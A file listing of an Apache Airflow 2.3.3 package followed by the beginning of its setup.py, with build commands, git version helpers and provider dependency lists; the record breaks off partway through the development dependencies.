0086_2_1_4_add_max_active_runs_column_to_dagmodel_.py 0087_2_1_4_add_index_on_state_dag_id_for_queued_.py 0088_2_2_0_improve_mssql_compatibility.py 0089_2_2_0_make_xcom_pkey_columns_non_nullable.py 0090_2_2_0_rename_concurrency_column_in_dag_table_.py 0091_2_2_0_add_trigger_table_and_task_info.py 0092_2_2_0_add_data_interval_start_end_to_dagmodel_and_dagrun.py 0093_2_2_0_taskinstance_keyed_to_dagrun.py 0094_2_2_3_add_has_import_errors_column_to_dagmodel.py 0095_2_2_4_add_session_table_to_db.py 0096_2_2_4_adding_index_for_dag_id_in_job.py 0097_2_3_0_increase_length_of_email_and_username.py 0098_2_3_0_added_timetable_description_column.py 0099_2_3_0_add_task_log_filename_template_model.py 0100_2_3_0_add_taskmap_and_map_id_on_taskinstance.py 0101_2_3_0_add_data_compressed_to_serialized_dag.py 0102_2_3_0_switch_xcom_table_to_use_run_id.py 0103_2_3_0_add_callback_request_table.py 0104_2_3_0_migrate_rtif_to_use_run_id_and_map_index.py 0105_2_3_0_add_map_index_to_taskfail.py 0106_2_3_0_update_migration_for_fab_tables_to_add_missing_constraints.py 0107_2_3_0_add_map_index_to_log.py 0108_2_3_0_default_dag_view_grid.py 0109_2_3_1_add_index_for_event_in_log.py 0110_2_3_2_add_cascade_to_dag_tag_foreignkey.py 0111_2_3_3_add_indexes_for_cascade_deletes.py __init__.py __init__.py abstractoperator.py base.py baseoperator.py connection.py crypto.py dag.py dagbag.py dagcode.py dagparam.py dagpickle.py dagrun.py db_callback_request.py errors.py log.py mappedoperator.py operator.py param.py pool.py renderedtifields.py sensorinstance.py serialized_dag.py skipmixin.py slamiss.py taskfail.py taskinstance.py tasklog.py taskmap.py taskmixin.py taskreschedule.py trigger.py variable.py xcom.py xcom_arg.py __init__.py decorators.py __init__.py __init__.py bash.py bash_operator.py branch.py branch_operator.py check_operator.py dagrun_operator.py datetime.py docker_operator.py druid_check_operator.py dummy.py dummy_operator.py email.py email_operator.py empty.py gcs_to_s3.py generic_transfer.py google_api_to_s3_transfer.py hive_operator.py hive_stats_operator.py hive_to_druid.py hive_to_mysql.py hive_to_samba_operator.py http_operator.py jdbc_operator.py latest_only.py latest_only_operator.py mssql_operator.py mssql_to_hive.py mysql_operator.py mysql_to_hive.py oracle_operator.py papermill_operator.py pig_operator.py postgres_operator.py presto_check_operator.py presto_to_mysql.py python.py python_operator.py redshift_to_s3_operator.py s3_file_transform_operator.py s3_to_hive_operator.py s3_to_redshift_operator.py slack_operator.py smooth.py sql.py sqlite_operator.py sql_branch_operator.py subdag.py subdag_operator.py trigger_dagrun.py weekday.py __init__.py plugins_manager.py providers_manager.py provider_info.schema.json base_secrets.py environment_variables.py local_filesystem.py metastore.py __init__.py kerberos.py permissions.py utils.py __init__.py base.py base_sensor_operator.py bash.py date_time.py date_time_sensor.py external_task.py external_task_sensor.py filesystem.py hdfs_sensor.py hive_partition_sensor.py http_sensor.py metastore_partition_sensor.py named_hive_partition_sensor.py python.py s3_key_sensor.py s3_prefix_sensor.py smart_sensor.py sql.py sql_sensor.py time_delta.py time_delta_sensor.py time_sensor.py web_hdfs_sensor.py weekday.py __init__.py sentry.py enums.py helpers.py json_schema.py schema.json serialized_objects.py __init__.py settings.py smart_sensor_group.py __init__.py stats.py base_task_runner.py cgroup_task_runner.py standard_task_runner.py __init__.py __init__.py templates.py base.py events.py interval.py simple.py __init__.py dependencies_deps.py dependencies_states.py base_ti_dep.py dagrun_backfill_dep.py dagrun_exists_dep.py dag_ti_slots_available_dep.py dag_unpaused_dep.py exec_date_after_start_date_dep.py mapped_task_expanded.py not_in_retry_period_dep.py not_previously_skipped_dep.py pool_slots_available_dep.py prev_dagrun_dep.py ready_to_reschedule.py runnable_exec_date_dep.py task_concurrency_dep.py task_not_running_dep.py trigger_rule_dep.py valid_state_dep.py __init__.py dep_context.py __init__.py base.py temporal.py testing.py __init__.py typing_compat.py airflow_flask_app.py cli.py cli_action_loggers.py code_utils.py compression.py configuration.py context.py context.pyi dag_cycle_tester.py dates.py db.py db_cleanup.py decorators.py docs.py dot_renderer.py edgemodifier.py email.py entry_points.py event_scheduler.py file.py helpers.py json.py jwt_signer.py cloudwatch_task_handler.py colored_log.py es_task_handler.py file_processor_handler.py file_task_handler.py gcs_task_handler.py json_formatter.py logging_mixin.py log_reader.py non_caching_file_handler.py s3_task_handler.py secrets_masker.py stackdriver_task_handler.py task_handler_with_custom_formatter.py wasb_task_handler.py __init__.py mixins.py module_loading.py net.py operator_helpers.py operator_resources.py orm_event_handlers.py platform.py process_utils.py python_virtualenv.py python_virtualenv_script.jinja2 retries.py serve_logs.py session.py sqlalchemy.py state.py strings.py task_group.py timeout.py timezone.py trigger_rule.py types.py weekday.py weight_rule.py yaml.py __init__.py version.py .babelrc .eslintignore .eslintrc .stylelintignore .stylelintrc endpoints.py __init__.py __init__.py app.py auth.py blueprints.py decorators.py init_appbuilder.py init_appbuilder_links.py init_dagbag.py init_jinja_globals.py init_manifest_files.py init_robots.py init_security.py init_session.py init_views.py init_wsgi_middlewares.py __init__.py manager.py manager.py models.py __init__.py __init__.py forms.py gunicorn_config.py jest-setup.js jest.config.js package.json security.py session.py airflow.gif bootstrap-theme.css calendar.css dags.css flash.css gantt.css graph.css grid.css loading-dots.css main.css material-icons.css switch.css airflowDefaultTheme.d3d1b0809f936a6f2b56.css airflowDefaultTheme.d3d1b0809f936a6f2b56.js bootstrap-datetimepicker.min.css bootstrap-datetimepicker.min.js bootstrap3-typeahead.min.js calendar.f5da7b189d26348eea87.css calendar.f5da7b189d26348eea87.js calendar.f5da7b189d26348eea87.js.LICENSE.txt codemirror.css codemirror.js coffeescript-lint.js connectionForm.ec3ec1657716a391da2d.js connectionForm.ec3ec1657716a391da2d.js.LICENSE.txt css-lint.js d3-shape.min.js d3-tip.js d3.min.js dag.d96f459ba381731f1b7f.js dag.d96f459ba381731f1b7f.js.LICENSE.txt dagCode.03352d4435c71024d80b.js dagCode.03352d4435c71024d80b.js.LICENSE.txt dagDependencies.b4be4366640d78278655.js dagDependencies.b4be4366640d78278655.js.LICENSE.txt dagre-d3.core.min.js dagre-d3.core.min.js.LICENSE.txt dagre-d3.core.min.js.map dagre-d3.min.js dagre-d3.min.js.LICENSE.txt dagre-d3.min.js.map dags.f7c40b546b5aa440c61d.css dags.f7c40b546b5aa440c61d.js dags.f7c40b546b5aa440c61d.js.LICENSE.txt dataTables.bootstrap.min.css dataTables.bootstrap.min.js dataTables.bootstrap.min.js.LICENSE.txt durationChart.aa827bbdd9cfba99399f.js durationChart.aa827bbdd9cfba99399f.js.LICENSE.txt flash.5adc3a4998ff394d2a3e.css flash.5adc3a4998ff394d2a3e.js gantt.55ea3ebe79acd3ab7fc8.css gantt.55ea3ebe79acd3ab7fc8.js gantt.55ea3ebe79acd3ab7fc8.js.LICENSE.txt graph.0619193301c1dcd39f52.css graph.0619193301c1dcd39f52.js graph.0619193301c1dcd39f52.js.LICENSE.txt grid.b5b8f304b97f905ad2ed.css grid.b5b8f304b97f905ad2ed.js grid.b5b8f304b97f905ad2ed.js.LICENSE.txt html-lint.js javascript-lint.js javascript.js jquery.dataTables.min.js jquery.dataTables.min.js.LICENSE.txt jshint.js jshint.js.LICENSE.txt json-lint.js lint.css lint.js loadingDots.37c7fd200eafd0c27df7.css loadingDots.37c7fd200eafd0c27df7.js main.d6649b884746315637be.css main.d6649b884746315637be.js main.d6649b884746315637be.js.LICENSE.txt manifest.json materialIcons.b5be025c4c658382069b.css materialIcons.b5be025c4c658382069b.js moment.c42e4c391a00d2899c5c.js moment.c42e4c391a00d2899c5c.js.LICENSE.txt nv.d3.min.css nv.d3.min.css.map nv.d3.min.js nv.d3.min.js.map oss-licenses.json redoc.standalone.js redoc.standalone.js.LICENSE.txt redoc.standalone.js.map sum.md5 switch.5d98f83f9b36aa989233.css switch.5d98f83f9b36aa989233.js task.2a55ee7bba7ae765b284.js task.2a55ee7bba7ae765b284.js.LICENSE.txt taskInstances.5bb0bb48e8295e355118.js taskInstances.5bb0bb48e8295e355118.js.LICENSE.txt tiLog.74059164f78498e04d63.js tiLog.74059164f78498e04d63.js.LICENSE.txt trigger.a93a374dcc4a07b5a61b.js trigger.a93a374dcc4a07b5a61b.js.LICENSE.txt variableEdit.c727e4367a386e11856c.js variableEdit.c727e4367a386e11856c.js.LICENSE.txt yaml-lint.js calendar.js connection_form.js dag.js dags.js dag_code.js dag_dependencies.js datetime_utils.js duration_chart.js gantt.js graph.js index.ts useClearRun.js useClearTask.js useConfirmMarkTask.js useExtraLinks.js useGridData.test.js useGridData.ts useMappedInstances.js useMarkFailedRun.js useMarkFailedTask.js useMarkSuccessRun.js useMarkSuccessTask.js useQueueRun.js useRunTask.js useTasks.test.jsx useTasks.ts AutoRefresh.jsx Clipboard.jsx Clipboard.test.jsx InstanceTooltip.test.tsx InstanceTooltip.tsx StatusBox.tsx Table.jsx Table.test.jsx TaskName.jsx TaskName.test.jsx Time.test.tsx Time.tsx Tooltip.tsx autorefresh.jsx containerRef.tsx timezone.jsx Bar.tsx index.test.tsx index.tsx Tooltip.jsx BreadcrumbText.tsx ConfirmDialog.jsx Dag.jsx ClearRun.jsx index.jsx MarkFailedRun.jsx MarkSuccessRun.jsx QueueRun.jsx Details.jsx ExtraLinks.jsx index.tsx Logs.jsx MappedInstances.jsx Nav.jsx ActionButton.jsx Clear.jsx MarkFailed.jsx MarkSuccess.jsx Run.jsx Header.tsx index.tsx FilterBar.jsx Grid.test.jsx Grid.tsx index.d.ts index.jsx LegendRow.test.tsx LegendRow.tsx Main.tsx README.md renderTaskRows.test.tsx renderTaskRows.tsx ResetRoot.jsx theme.ts ToggleGroups.jsx index.ts index.ts testUtils.jsx useErrorToast.js useErrorToast.test.jsx useFilters.js useFilters.test.jsx useSelection.test.tsx useSelection.ts main.js task.js task_instances.js ti_log.js trigger.js utils.js variable_edit.js loading.gif pin.svg pin_100.png pin_25.png pin_32.png pin_35.png pin_40.png pin_large.png robots.txt sort_asc.png sort_both.png sort_desc.png calendar.html chart.html code.html config.html confirm.html conn_create.html conn_edit.html dag.html dagrun_details.html dags.html dag_audit_log.html dag_code.html dag_dependencies.html dag_details.html duration_chart.html gantt.html graph.html grid.html main.html model_list.html noaccess.html not_found.html no_roles_permissions.html plugin.html providers.html redoc.html task.html task_instance.html ti_code.html ti_log.html traceback.html trigger.html variable_edit.html variable_list.html variable_show.html variable_show_widget.html xcom.html _messages.html google_analytics.html metarouter.html segment.html custom_icons.html dag_docs.html flash.html index.html loading_dots.html navbar.html navbar_menu.html navbar_right.html tsconfig.json utils.py validators.py views.py webpack.config.js widgets.py __init__.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE LICENSE-bootstrap.txt LICENSE-bootstrap3-typeahead.txt LICENSE-d3-shape.txt LICENSE-d3-tip.txt LICENSE-d3js.txt LICENSE-dagre-d3.txt LICENSE-datatables.txt LICENSE-elasticmock.txt LICENSE-eonasdan-bootstrap-datetimepicker.txt LICENSE-flask-kerberos.txt LICENSE-hue.txt LICENSE-jqclock.txt LICENSE-jquery.txt LICENSE-moment-strftime.txt LICENSE-moment.txt LICENSE-normalize.txt LICENSES-ui.txt MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md RELEASE_NOTES.rst airflow airflow-flower.service airflow-kerberos.service airflow-scheduler.service airflow-webserver.service airflow-worker.service airflow.conf README setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Setup.py for the Airflow project.""""""
import glob
import logging
import os
import subprocess
import sys
import unittest
from copy import deepcopy
from os.path import dirname, relpath
from textwrap import wrap
from typing import Dict, List

from setuptools import Command, Distribution, find_namespace_packages, setup
from setuptools.command.develop import develop as develop_orig
from setuptools.command.install import install as install_orig

# Setuptools patches this import to point to a vendored copy instead of the
# stdlib, which is deprecated in Python 3.10 and will be removed in 3.12.
from distutils import log  # isort: skip

# Controls whether providers are installed from packages or directly from sources
# It is turned on by default in case of development environments such as Breeze
# And it is particularly useful when you add a new provider and there is no
# PyPI version to install the provider package from
INSTALL_PROVIDERS_FROM_SOURCES = 'INSTALL_PROVIDERS_FROM_SOURCES'
PY39 = sys.version_info >= (3, 9)

logger = logging.getLogger(__name__)

version = '2.3.3'

my_dir = dirname(__file__)


def airflow_test_suite() -> unittest.TestSuite:
    """"""Test suite for Airflow tests""""""
    test_loader = unittest.TestLoader()
    test_suite = test_loader.discover(os.path.join(my_dir, 'tests'), pattern='test_*.py')
    return test_suite


class CleanCommand(Command):
    """"""
    Command to tidy up the project root.
    Registered as cmdclass in setup() so it can be called with ``python setup.py extra_clean``.
    """"""

    description = ""Tidy up the project root""
    user_options: List[str] = []

    def initialize_options(self) -> None:
        """"""Set default values for options.""""""

    def finalize_options(self) -> None:
        """"""Set final values for options.""""""

    @staticmethod
    def rm_all_files(files: List[str]) -> None:
        """"""Remove all files from the list""""""
        for file in files:
            try:
                os.remove(file)
            except Exception as e:
                logger.warning(""Error when removing %s: %s"", file, e)

    def run(self) -> None:
        """"""Remove temporary files and directories.""""""
        os.chdir(my_dir)
        self.rm_all_files(glob.glob('./build/*'))
        self.rm_all_files(glob.glob('./**/__pycache__/*', recursive=True))
        self.rm_all_files(glob.glob('./**/*.pyc', recursive=True))
        self.rm_all_files(glob.glob('./dist/*'))
        self.rm_all_files(glob.glob('./*.egg-info'))
        self.rm_all_files(glob.glob('./docker-context-files/*.whl'))
        self.rm_all_files(glob.glob('./docker-context-files/*.tgz'))


class CompileAssets(Command):
    """"""
    Compile and build the frontend assets using yarn and webpack.
    Registered as cmdclass in setup() so it can be called with ``python setup.py compile_assets``.
    """"""

    description = ""Compile and build the frontend assets""
    user_options: List[str] = []

    def initialize_options(self) -> None:
        """"""Set default values for options.""""""

    def finalize_options(self) -> None:
        """"""Set final values for options.""""""

    def run(self) -> None:
        """"""Run a command to compile and build assets.""""""
        subprocess.check_call('./airflow/www/compile_assets.sh')


class ListExtras(Command):
    """"""
    List all available extras
    Registered as cmdclass in setup() so it can be called with ``python setup.py list_extras``.
    """"""

    description = ""List available extras""
    user_options: List[str] = []

    def initialize_options(self) -> None:
        """"""Set default values for options.""""""

    def finalize_options(self) -> None:
        """"""Set final values for options.""""""

    def run(self) -> None:
        """"""List extras.""""""
        print(""\n"".join(wrap("", "".join(EXTRAS_REQUIREMENTS.keys()), 100)))


def git_version(version_: str) -> str:
    """"""
    Return a version to identify the state of the underlying git repo. The version will
    indicate whether the head of the current git-backed working directory is tied to a
    release tag or not : it will indicate the former with a 'release:{version}' prefix
    and the latter with a '.dev0' suffix. Following the prefix will be a sha of the current
    branch head. Finally, a ""dirty"" suffix is appended to indicate that uncommitted
    changes are present.

    :param str version_: Semver version
    :return: Found Airflow version in Git repo
    :rtype: str
    """"""
    try:
        import git

        try:
            repo = git.Repo(os.path.join(*[my_dir, '.git']))
        except git.NoSuchPathError:
            logger.warning('.git directory not found: Cannot compute the git version')
            return ''
        except git.InvalidGitRepositoryError:
            logger.warning('Invalid .git directory not found: Cannot compute the git version')
            return ''
    except ImportError:
        logger.warning('gitpython not found: Cannot compute the git version.')
        return ''
    if repo:
        sha = repo.head.commit.hexsha
        if repo.is_dirty():
            return f'.dev0+{sha}.dirty'
        # commit is clean
        return f'.release:{version_}+{sha}'
    return 'no_git_version'


def write_version(filename: str = os.path.join(*[my_dir, ""airflow"", ""git_version""])) -> None:
    """"""
    Write the Semver version + git hash to file, e.g. "".dev0+2f635dc265e78db6708f59f68e8009abb92c1e65"".

    :param str filename: Destination file to write
    """"""
    text = f""{git_version(version)}""
    with open(filename, 'w') as file:
        file.write(text)


pandas_requirement = 'pandas>=0.17.1'

# 'Start dependencies group' and 'Start dependencies group' are mark for ./scripts/ci/check_order_setup.py
# If you change this mark you should also change ./scripts/ci/check_order_setup.py
# Start dependencies group
alibaba = [
    'oss2>=2.14.0',
]
amazon = [
    'boto3>=1.15.0',
    # watchtower 3 has been released end Jan and introduced breaking change across the board that might
    # change logging behaviour:
    # https://github.com/kislyuk/watchtower/blob/develop/Changes.rst#changes-for-v300-2022-01-26
    # TODO: update to watchtower >3
    'watchtower~=2.0.1',
    'jsonpath_ng>=1.5.3',
    'redshift_connector>=2.0.888',
    'sqlalchemy_redshift>=0.8.6',
    pandas_requirement,
    'mypy-boto3-rds>=1.21.0',
    'mypy-boto3-redshift-data>=1.21.0',
]
apache_beam = [
    'apache-beam>=2.39.0',
]
arangodb = ['python-arango>=7.3.2']
asana = ['asana>=0.10']
async_packages = [
    'eventlet>=0.9.7',
    'gevent>=0.13',
    'greenlet>=0.4.9',
]
atlas = [
    'atlasclient>=0.1.2',
]
azure = [
    'azure-batch>=8.0.0',
    'azure-cosmos>=4.0.0',
    'azure-datalake-store>=0.0.45',
    'azure-identity>=1.3.1',
    'azure-keyvault-secrets>=4.1.0,<5.0',
    'azure-kusto-data>=0.0.43,<0.1',
    # Azure integration uses old librarires and the limits below reflect that
    # TODO: upgrade to newer versions of all the below libraries
    'azure-mgmt-containerinstance>=1.5.0,<2.0',
    'azure-mgmt-datafactory>=1.0.0,<2.0',
    'azure-mgmt-datalake-store>=0.5.0',
    'azure-mgmt-resource>=2.2.0',
    # limited due to https://github.com/Azure/azure-sdk-for-python/pull/18801  implementation released in 12.9
    'azure-storage-blob>=12.7.0,<12.9.0',
    'azure-storage-common>=2.1.0',
    'azure-storage-file>=2.1.0',
    # Limited due to https://github.com/Azure/azure-uamqp-python/issues/191
    'azure-servicebus>=7.6.1; platform_machine != ""aarch64""',
]
cassandra = [
    'cassandra-driver>=3.13.0',
]
celery = [
    # The Celery is known to introduce problems when upgraded to a MAJOR version. Airflow Core
    # Uses Celery for CeleryExecutor, and we also know that Kubernetes Python client follows SemVer
    # (https://docs.celeryq.dev/en/stable/contributing.html?highlight=semver#versions).
    # This is a crucial component of Airflow, so we should limit it to the next MAJOR version and only
    # deliberately bump the version when we tested it, and we know it can be bumped.
    # Bumping this version should also be connected with
    # limiting minimum airflow version supported in cncf.kubernetes provider, due to the
    # potential breaking changes in Airflow Core as well (celery is added as extra, so Airflow
    # core is not hard-limited via install-requirements, only by extra).
    'celery>=5.2.3,<6',
    'flower>=1.0.0',
]
cgroups = [
    # Cgroupspy 0.2.2 added Python 3.10 compatibility
    'cgroupspy>=0.2.2',
]
cloudant = [
    'cloudant>=2.0',
]
dask = [
    # Dask support is limited, we need Dask team to upgrade support for dask if we were to continue
    # Supporting it in the future
    'cloudpickle>=1.4.1',
    'dask>=2.9.0',
    'distributed>=2.11.1',
]
databricks = [
    'requests>=2.27,<3',
    'databricks-sql-connector>=2.0.0, <3.0.0',
    'aiohttp>=3.6.3, <4',
]
datadog = [
    'datadog>=0.14.0',
]
deprecated_api = [
    'requests>=2.26.0',
]
doc = [
    'click>=8.0',
    'sphinx>=4.4.0',
    # Docutils 0.17.0 converts generated <div class=""section""> into <section> and breaks our doc formatting
    # By adding a lot of whitespace separation. This limit can be lifted when we update our doc to handle
    # <section> tags for sections
    'docutils<0.17.0',
    # Without this, Sphinx goes in to a _very_ large backtrack on Python 3.7,
    # even though Sphinx 4.4.0 has this but with python_version<3.10.
    'importlib-metadata>=4.4; python_version < ""3.8""',
    'sphinx-airflow-theme',
    'sphinx-argparse>=0.1.13',
    'sphinx-autoapi>=1.8.0',
    'sphinx-copybutton',
    'sphinx-jinja>=2.0',
    'sphinx-rtd-theme>=0.1.6',
    'sphinxcontrib-httpdomain>=1.7.0',
    'sphinxcontrib-redoc>=1.6.0',
    'sphinxcontrib-spelling>=7.3',
]
docker = [
    'docker>=5.0.3',
]
drill = ['sqlalchemy-drill>=1.1.0', 'sqlparse>=0.4.1']
druid = [
    'pydruid>=0.4.1',
]
elasticsearch = [
    'elasticsearch>7',
    'elasticsearch-dbapi',
    'elasticsearch-dsl>=5.0.0',
]
exasol = ['pyexasol>=0.5.1', pandas_requirement]
facebook = [
    'facebook-business>=6.0.2',
]
flask_appbuilder_oauth = [
    'flask-appbuilder[oauth]',
]
github = [
    'pygithub',
]
google = [
    # Google has very clear rules on what dependencies should be used. All the limits below
    # follow strict guidelines of Google Libraries as quoted here:
    # While this issue is open, dependents of google-api-core, google-cloud-core. and google-auth
    # should preserve >1, <3 pins on these packages.
    # https://github.com/googleapis/google-cloud-python/issues/10566
    # Some of Google Packages are limited to <2.0.0 because 2.0.0 releases of the libraries
    # Introduced breaking changes across the board. Those libraries should be upgraded soon
    # TODO: Upgrade all Google libraries that are limited to <2.0.0
    'PyOpenSSL',
    'google-ads>=15.1.1',
    'google-api-core>=2.7.0,<3.0.0',
    'google-api-python-client>=1.6.0,<2.0.0',
    'google-auth>=1.0.0',
    'google-auth-httplib2>=0.0.1',
    'google-cloud-aiplatform>=1.7.1,<2.0.0',
    'google-cloud-automl>=2.1.0',
    'google-cloud-bigquery-datatransfer>=3.0.0',
    'google-cloud-bigtable>=1.0.0,<2.0.0',
    'google-cloud-build>=3.0.0',
    'google-cloud-container>=2.2.0,<3.0.0',
    'google-cloud-datacatalog>=3.0.0',
    'google-cloud-dataplex>=0.1.0',
    'google-cloud-dataproc>=3.1.0',
    'google-cloud-dataproc-metastore>=1.2.0,<2.0.0',
    'google-cloud-dlp>=0.11.0,<2.0.0',
    'google-cloud-kms>=2.0.0',
    'google-cloud-language>=1.1.1,<2.0.0',
    'google-cloud-logging>=2.1.1',
    'google-cloud-memcache>=0.2.0',
    'google-cloud-monitoring>=2.0.0',
    'google-cloud-os-login>=2.0.0',
    'google-cloud-orchestration-airflow>=1.0.0,<2.0.0',
    'google-cloud-pubsub>=2.0.0',
    'google-cloud-redis>=2.0.0',
    'google-cloud-secret-manager>=0.2.0,<2.0.0',
    'google-cloud-spanner>=1.10.0,<2.0.0',
    'google-cloud-speech>=0.36.3,<2.0.0',
    'google-cloud-storage>=1.30,<2.0.0',
    'google-cloud-tasks>=2.0.0',
    'google-cloud-texttospeech>=0.4.0,<2.0.0',
    'google-cloud-translate>=1.5.0,<2.0.0',
    'google-cloud-videointelligence>=1.7.0,<2.0.0',
    'google-cloud-vision>=0.35.2,<2.0.0',
    'google-cloud-workflows>=0.1.0,<2.0.0',
    'grpcio-gcp>=0.2.2',
    'httpx',
    'json-merge-patch>=0.2',
    'looker-sdk>=22.2.0',
    'pandas-gbq',
    pandas_requirement,
    'sqlalchemy-bigquery>=1.2.1',
]
grpc = [
    # Google has very clear rules on what dependencies should be used. All the limits below
    # follow strict guidelines of Google Libraries as quoted here:
    # While this issue is open, dependents of google-api-core, google-cloud-core. and google-auth
    # should preserve >1, <3 pins on these packages.
    # https://github.com/googleapis/google-cloud-python/issues/10566
    'google-auth>=1.0.0, <3.0.0',
    'google-auth-httplib2>=0.0.1',
    'grpcio>=1.15.0',
]
hashicorp = [
    'hvac>=0.10',
]
hdfs = [
    'snakebite-py3',
    'hdfs[avro,dataframe,kerberos]>=2.0.4',
]
hive = [
    'hmsclient>=0.1.0',
    'pyhive[hive]>=0.6.0',
    # in case of Python 3.9 sasl library needs to be installed with version higher or equal than
    # 0.3.1 because only that version supports Python 3.9. For other Python version pyhive[hive] pulls
    # the sasl library anyway (and there sasl library version is not relevant)
    'sasl>=0.3.1; python_version>=""3.9""',
    'thrift>=0.9.2',
    pandas_requirement,
]
http = [
    # The 2.26.0 release of requests got rid of the chardet LGPL mandatory dependency, allowing us to
    # release it as a requirement for airflow
    'requests>=2.26.0',
]
http_provider = [
    'apache-airflow-providers-http',
]
influxdb = [
    'influxdb-client>=1.19.0',
    pandas_requirement,
]
jdbc = [
    'jaydebeapi>=1.1.1',
]
jenkins = [
    'python-jenkins>=1.0.0',
]
jira = [
    'JIRA>1.0.7',
]
kerberos = [
    'pykerberos>=1.1.13',
    'requests_kerberos>=0.10.0',
    'thrift_sasl>=0.2.0',
]
kubernetes = [
    'cryptography>=2.0.0',
    # The Kubernetes API is known to introduce problems when upgraded to a MAJOR version. Airflow Core
    # Uses Kubernetes for Kubernetes executor, and we also know that Kubernetes Python client follows SemVer
    # (https://github.com/kubernetes-client/python#compatibility). This is a crucial component of Airflow
    # So we should limit it to the next MAJOR version and only deliberately bump the version when we
    # tested it, and we know it can be bumped. Bumping this version should also be connected with
    # limiting minimum airflow version supported in cncf.kubernetes provider, due to the
    # potential breaking changes in Airflow Core as well (kubernetes is added as extra, so Airflow
    # core is not hard-limited via install-requirements, only by extra).
    'kubernetes>=21.7.0,<24',
]
kylin = ['kylinpy>=2.6']
ldap = [
    'ldap3>=2.5.1',
    'python-ldap',
]
leveldb = ['plyvel; platform_machine != ""aarch64""']
mongo = [
    'dnspython>=1.13.0',
    # pymongo 4.0.0 removes connection option `ssl_cert_reqs` which is used in providers-mongo/2.2.0
    # TODO: Upgrade to pymongo 4.0.0+
    'pymongo>=3.6.0,<4.0.0',
]
mssql = [
    'pymssql>=2.1.5; platform_machine != ""aarch64""',
]
mysql = [
    'mysql-connector-python>=8.0.11; platform_machine != ""aarch64""',
    'mysqlclient>=1.3.6; platform_machine != ""aarch64""',
]
neo4j = ['neo4j>=4.2.1']
odbc = [
    'pyodbc',
]
opsgenie = [
    'opsgenie-sdk>=2.1.5',
]
oracle = [
    'cx_Oracle>=5.1.2',
]
pagerduty = [
    'pdpyras>=4.1.2',
]
pandas = [
    pandas_requirement,
]
papermill = [
    'papermill[all]>=1.2.1',
    'scrapbook[all]',
]
password = [
    'bcrypt>=2.0.0',
    'flask-bcrypt>=0.7.1',
]
pinot = [
    # pinotdb v0.1.1 may still work with older versions of Apache Pinot, but we've confirmed that it
    # causes a problem with newer versions.
    'pinotdb>0.1.2',
]
plexus = [
    'arrow>=0.16.0',
]
postgres = [
    'psycopg2-binary>=2.7.4',
]
presto = [
    'presto-python-client>=0.8.2',
    pandas_requirement,
]
psrp = [
    'pypsrp>=0.8',
]
qubole = [
    'qds-sdk>=1.10.4',
]
rabbitmq = [
    'amqp',
]
redis = [
    # Redis 4 introduced a number of changes that likely need testing including mixins in redis commands
    # as well as unquoting URLS with `urllib.parse.unquote`:
    # https://github.com/redis/redis-py/blob/master/CHANGES
    # TODO: upgrade to support redis package >=4
    'redis~=3.2',
]
salesforce = ['simple-salesforce>=1.0.0', 'tableauserverclient', pandas_requirement]
samba = [
    'smbprotocol>=1.5.0',
]
segment = [
    'analytics-python>=1.2.9',
]
sendgrid = [
    'sendgrid>=6.0.0',
]
sentry = [
    'blinker>=1.1',
    'sentry-sdk>=0.8.0',
]
singularity = ['spython>=0.0.56']
slack = [
    'slack_sdk>=3.0.0',
]
snowflake = [
    'snowflake-connector-python>=2.4.1',
    'snowflake-sqlalchemy>=1.1.0',
]
spark = [
    'pyspark',
]
ssh = [
    'paramiko>=2.6.0',
    'pysftp>=0.2.9',
    'sshtunnel>=0.3.2',
]
statsd = [
    'statsd>=3.3.0',
]
tableau = [
    'tableauserverclient',
]
telegram = [
    'python-telegram-bot>=13.0',
]
trino = [
    'trino>=0.301.0',
    pandas_requirement,
]
vertica = [
    'vertica-python>=0.5.1',
]
virtualenv = [
    'virtualenv',
]
webhdfs = [
    'hdfs[avro,dataframe,kerberos]>=2.0.4',
]
winrm = [
    'pywinrm>=0.4',
]
yandex = [
    'yandexcloud>=0.146.0',
]
zendesk = [
    'zenpy>=2.0.24',
]
# End dependencies group

# Mypy 0.900 and above ships only with stubs from stdlib so if we need other stubs, we need to install them
# manually as `types-*`. See https://mypy.readthedocs.io/en/stable/running_mypy.html#missing-imports
# for details. Wy want to install them explicitly because we want to eventually move to
# mypyd which does not support installing the types dynamically with --install-types
mypy_dependencies = [
    # TODO: upgrade to newer versions of MyPy continuously as they are released
    'mypy==0.910',
    'types-boto',
    'types-certifi',
    'types-croniter',
    'types-Deprecated',
    'types-docutils',
    'types-freezegun',
    'types-paramiko',
    'types-protobuf',
    'types-python-dateutil',
    'types-python-slugify',
    'types-pytz',
    'types-redis',
    'types-requests',
    'types-setuptools',
    'types-termcolor',
    'types-tabulate',
    'types-toml',
    'types-Markdown',
    'types-PyMySQL',
    'types-PyYAML',
]

# Dependencies needed for development only
devel_only = [
    'asynctest~=0.13',
    'aws_xray_sdk',
    'beautifulsoup4>=4.7.1',
    'black',
    'blinker',
    'bowler',
    'click>=8.0',
    'coverage',
    'filelock',
    'flake8>=3.6.0',
    'flake8-colors',
    'flake8-implicit-str-concat',
    'flaky',
    'freezegun',
    'gitpython',
    'ipdb',
    'jira',
    'jsondiff',
    'mongomock',
    'moto[cloudformation, glue]>=3.1.12',
    'parameterized',
    'paramiko',
    'pipdeptree',
    'pre-commit',
    'pypsrp',
    'pygithub',
    'pysftp',
    # Pytest 7 has been released in February 2022 and we should attempt to upgrade and remove the limit
    # It contains a number of potential breaking changes but none of them looks breaking our use
    # https://docs.pytest.org/en/latest/changelog.html#pytest-7-0-0-2022-02-03
    # TODO: upgrade it and remove the limit
    'pytest~=6.0',
    'pytest-asyncio',
    'pytest-cov',
    'pytest-instafail',
    # We should attempt to remove the limit when we upgrade Pytest
    # TODO: remove the limit when we upgrade pytest
    'pytest-rerunfailures~=9.1',
    'pytest-timeouts',
    'pytest-xdist',
    'python-jose',
    'pywinrm',
    'qds-sdk>=1.9.6',
    'pytest-httpx',
